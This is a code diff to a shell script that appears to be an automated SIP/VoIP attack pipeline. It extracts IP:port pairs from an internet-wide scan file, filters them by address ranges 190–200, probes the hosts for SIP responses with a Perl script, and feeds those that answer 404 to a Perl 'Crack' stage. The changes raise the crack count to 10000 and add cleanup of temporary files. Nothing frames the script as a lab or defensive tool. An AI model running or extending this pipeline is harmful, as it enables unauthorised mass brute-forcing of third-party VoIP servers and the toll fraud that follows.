@@ -17,7 +17,7 @@ grep -Po "(\d+\.){3}\d+:?(\d?){6}" Allworldresult.txt >>Allworldresult2.txt
 
 awk '$0="Mohammad"$0' Allworldresult2.txt >Hosts.txt
 
-grep -R 'Mohammad190' Hosts.txt >newHosts.txt
+grep -R 'Mohammad190' Hosts.txt >newHosts0.txt
 grep -R 'Mohammad191' Hosts.txt >newHosts1.txt
 grep -R 'Mohammad192' Hosts.txt >newHosts2.txt
 grep -R 'Mohammad193' Hosts.txt >newHosts3.txt
@@ -29,14 +29,25 @@ grep -R 'Mohammad198' Hosts.txt >newHosts8.txt
 grep -R 'Mohammad199' Hosts.txt >newHosts9.txt
 grep -R 'Mohammad200' Hosts.txt >newHosts10.txt
 
-cat newHosts.txt newHosts1.txt newHosts2.txt newHosts3.txt newHosts4.txt newHosts5.txt newHosts6.txt newHosts7.txt newHosts8.txt newHosts9.txt newHosts10.txt >> newHosts.txt
+cat newHosts0.txt newHosts1.txt newHosts2.txt newHosts3.txt newHosts4.txt newHosts5.txt newHosts6.txt newHosts7.txt newHosts8.txt newHosts9.txt newHosts10.txt >> newHosts.txt
 
-grep -Po "(\d+\.){3}\d+:?(\d?){6}" newHosts.txt >>newHosts1.txt
-grep -R ':' newHosts1.txt >IPS
-rm newHosts1.txt
+grep -Po "(\d+\.){3}\d+:?(\d?){6}" newHosts.txt >>newHosts10.txt
+grep -R ':' newHosts10.txt >IPS
+rm newHosts10.txt
 rm newHosts.txt
 rm Hosts.txt
 rm Allworldresult2.txt
+rm newHosts0.txt
+rm newHosts1.txt
+rm newHosts2.txt
+rm newHosts3.txt
+rm newHosts4.txt
+rm newHosts5.txt
+rm newHosts6.txt
+rm newHosts7.txt
+rm newHosts8.txt
+rm newHosts9.txt
+rm newHosts10.txt
 sleep 1
 
 echo -e "\nEnding scanning port !\n"
@@ -47,7 +58,7 @@ echo -e "\nEnding scanning port !\n"
 echo -e "\nStart SIP Responses ...\n"
 
 perl run IPS
-cat 403.pal 404.pal >> ipSIP
+cat 404.pal >> ipSIP
 rm IPS # remove the file IPS
 sleep 2
 
@@ -57,9 +68,9 @@ echo -e "\nEnding Responses !\n"
 
 echo -e "\nStart SIP Crack ...\n"
 
-perl Crack 1000 2 ipSIP
+perl Crack 10000 1 ipSIP
 rm ipSIP # remove the file ipSIP
-rm *.pal # remove the file
+rm *.pal1 # remove the file
 
 sleep 2
 
